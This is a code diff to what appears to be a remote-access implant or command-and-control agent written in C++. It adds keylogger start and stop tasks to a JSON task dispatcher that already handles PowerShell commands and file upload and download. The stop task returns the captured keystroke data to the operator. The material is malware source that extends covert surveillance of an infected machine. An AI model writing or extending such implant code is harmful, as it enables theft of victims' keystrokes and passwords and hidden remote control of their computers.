@@ -3,6 +3,7 @@
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
 #include "Task.h"
+#include <Keylogger.h>
 
 #define SUCCESSFUL "Successful"
 #define FAILURE "Failure"
@@ -21,6 +22,24 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 
 	switch (type)
 	{
+
+	case KEYLOGGER_START:
+	{
+		Keylogger keylogger;
+		keylogger.keylog_start();
+		return CreateTaskRequest<Keylogger>(taskID, KEYLOGGER_START, NO_CODE, RUNNING, TaskSuccess{""});
+	}
+	break;
+
+	case KEYLOGGER_STOP:
+	{
+		Keylogger keylogger;
+		keylogger.keylog_stop();
+		std::string result = keylogger.get_keylog_data(taskID).data;
+		return CreateTaskRequest<Keylogger>(taskID, KEYLOGGER_STOP, NO_CODE, SUCCESS, TaskSuccess{result});
+	}
+	break;
+
 	case POWERSHELL:
 		auto cmd = node["Commandlet"].GetString();
 		auto arg = node["Arguements"].GetString();
@@ -37,7 +56,8 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 			CommandUploadFile{node["Path"].GetString()}};
 	}
 
-	case DOWNLOAD_2:
+	// TODO : CHANGE TO USE CreateTaskRequest
+	case DOWNLOAD_CHUNK:
 	{
 		if (code != DOWNLOAD ||
 			!node.HasMember("Path") ||
